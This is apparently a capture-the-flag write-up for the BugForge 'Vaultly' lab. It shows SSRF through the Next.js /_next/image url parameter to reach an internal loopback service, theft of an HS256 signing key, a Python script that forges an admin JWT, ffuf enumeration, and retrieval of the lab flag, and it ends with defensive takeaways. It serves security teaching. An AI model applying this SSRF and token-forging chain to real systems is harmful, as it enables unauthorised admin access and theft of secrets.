# Vaultly — BugForge Write-up

## Lab Information

* **Challenge:** Vaultly
* **Lab Variant:** `vaultly-013`
* **Category:** Web Security
* **Hint:** `_next`

---

## 1. Login

The Vaultly application provides shared test accounts.

Use one of the provided accounts:

```text
Email: owner@acme.test
Password: vaultly
```

After logging in, intercept the application's requests using **Burp Suite**.

---

## 2. Discover the Next.js Image Endpoint

While inspecting the requests, look for the Next.js image optimization endpoint:

```http
GET /_next/image?url=http://127.0.0.1:9000/badge/soc2.svg&w=256&q=75
```

The important parameter is:

```text
url=
```

The server appears to retrieve the URL supplied through this parameter.

This is worth testing for **Server-Side Request Forgery (SSRF)**.

---

## 3. Confirm SSRF

Modify the request in Burp Repeater:

```http
GET /_next/image?url=http://127.0.0.1:9000&w=256&q=75
```

Send the request.

The response contains information from an internal service:

```text
Vaulty internal branding service

GET /badge/soc2.svg (public)
GET /badge/signing-key.svg (restricted - ops)

loopback only 127.0.0.1:9000
```

This confirms that the Next.js image endpoint can make server-side requests to the internal service.

### Vulnerability

```text
Server-Side Request Forgery (SSRF)
```

---

## 4. Access the Internal Signing-Key Resource

The internal service revealed another endpoint:

```text
/badge/signing-key.svg
```

Request it through the SSRF:

```http
GET /_next/image?url=http://127.0.0.1:9000/badge/signing-key.svg&w=256&q=75
```

The returned SVG contains the Operations Console authentication information:

```text
Vaultly HQ — Ops Session Signing Key

cookie: vaultly_ops
alg: HS256
console: /admin

required claims:
{"staff":true,"iss":"vaultly-hq-ops","aud":"vaultly-admin-console"}

HS256 key (utf-8 bytes of this hex string):
53de1b61fee7008c06f5a5e7a120e44f55cbfe03b684bc8a4c6a504965bc815b
```

Save the signing key.

---

## 5. Forge the `vaultly_ops` JWT

The challenge specifically states that the key should be treated as the **UTF-8 bytes of the hex string**.

Therefore, do not use `bytes.fromhex()`.

Generate the JWT using:

```bash
python3 - << 'PY'
import jwt

key = "53de1b61fee7008c06f5a5e7a120e44f55cbfe03b684bc8a4c6a504965bc815b"

payload = {
    "staff": True,
    "iss": "vaultly-hq-ops",
    "aud": "vaultly-admin-console"
}

token = jwt.encode(
    payload,
    key.encode("utf-8"),
    algorithm="HS256"
)

print(token)
PY
```

Copy the generated JWT.

---

## 6. Replace the `vaultly_ops` Cookie

Open the browser's developer tools and navigate to:

```text
Storage → Cookies
```

Add a new cookie and nma:

```text
vaultly_ops
```

Replace its value with the forged JWT.

Keep the existing:

```text
vaultly_session
```

cookie unchanged.

---

## 7. Enumerate the Admin Endpoint

Run:
```
ffuf -u https://lab-1790656647325-qyma6s.labs-app.bugforge.io/FUZZ \
-w /usr/share/wordlists/dirb/common.txt
```
The enumeration finds `/admin`.

Navigate to:

```text
/admin
```

For example:

```text
https://lab-1790656647325-qyma6s.labs-app.bugforge.io/admin
```

The forged `vaultly_ops` cookie should authenticate the request.

The page displays:

```text
Vaultly HQ — Operations Console
```

Look for the **Break-glass recovery key** section.

It reveals the endpoint:

```text
GET /admin/api/recovery
```

---

## 8. Request the Recovery Key

Send the following request through Burp Repeater:

```http
GET /admin/api/recovery HTTP/2
Host: lab-1790656647325-qyma6s.labs-app.bugforge.io
Cookie: vaultly_session=YOUR_SESSION; vaultly_ops=YOUR_FORGED_JWT
```

The server returns JSON containing:

```json
{
  "org": "Vaultly HQ",
  "record": "break-glass",
  "recovery_key": "bug{...}",
  "note": "Emergency access key — rotate immediately after use."
}
```

The value of `recovery_key` is the flag.

---

## 9. Flag

```text
bug{FwShF9tXRw0fzRhNeuPslX6slJq97w9x}
```

---

## Exploitation Chain

```text
Login
  │
  ▼
Next.js /_next/image
  │
  ▼
url= parameter
  │
  ▼
SSRF
  │
  ▼
127.0.0.1:9000
  │
  ▼
/badge/signing-key.svg
  │
  ▼
Recover HS256 signing key
  │
  ▼
Forge vaultly_ops JWT
  │
  ▼
/admin
  │
  ▼
/admin/api/recovery
  │
  ▼
Recover Flag
```

## Key Takeaways

* Next.js image optimization endpoints can become SSRF primitives when arbitrary remote URLs are accepted.
* Internal services should not be reachable through user-controlled server-side fetches.
* Sensitive signing keys should never be exposed through publicly accessible internal endpoints.
* JWT signing secrets must be protected because possession of an HS256 secret allows an attacker to create valid tokens.
* Administrative endpoints should enforce strong authorization independently of client-controlled cookies.
* Internal recovery secrets should not be exposed through predictable endpoints without additional authentication and authorization controls.